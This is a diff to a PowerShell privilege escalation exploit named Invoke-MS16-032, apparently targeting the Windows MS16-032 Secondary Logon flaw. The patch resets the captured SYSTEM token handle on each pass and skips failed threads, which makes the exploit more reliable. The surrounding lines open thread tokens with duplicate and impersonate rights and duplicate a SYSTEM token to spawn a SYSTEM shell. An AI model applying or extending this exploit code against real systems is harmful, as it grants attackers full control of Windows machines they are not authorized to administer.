@@ -240,8 +240,7 @@ function Invoke-MS16-032 {
 			echo "[+] Thread resumed!"
 			Return
 		}
-	
-		$script:SysTokenHandle = [IntPtr]::Zero
+
 		# 0x0006 --> TOKEN_DUPLICATE -bor TOKEN_IMPERSONATE
 		$CallResult = [Advapi32]::OpenThreadToken($Thread, 0x0006, $false, [ref]$SysTokenHandle)
 		if (!$CallResult) {
@@ -294,7 +293,7 @@ function Invoke-MS16-032 {
 	}
 	
 	if ($($ThreadArray.length) -eq 0) {
-		echo "[!] No valid thread handles were captured, exiting!"
+		echo "[!] No valid thread handles were captured, exiting!`n"
 		Return
 	} else {
 		echo "[?] Done, got $($ThreadArray.length) thread handle(s)!"
@@ -304,9 +303,17 @@ function Invoke-MS16-032 {
 	
 	echo "`n[*] Sniffing out privileged impersonation token.."
 	foreach ($Thread in $ThreadArray){
-	
+		
+		# Null $SysTokenHandle
+		$script:SysTokenHandle = [IntPtr]::Zero
+		
 		# Get handle to SYSTEM access token
 		Get-SystemToken
+		
+		# If we fail a check in Get-SystemToken, skip loop
+		if ($SysTokenHandle -eq 0) {
+			continue
+		}
 		
 		echo "`n[*] Sniffing out SYSTEM shell.."
 		echo "`n[>] Duplicating SYSTEM token"
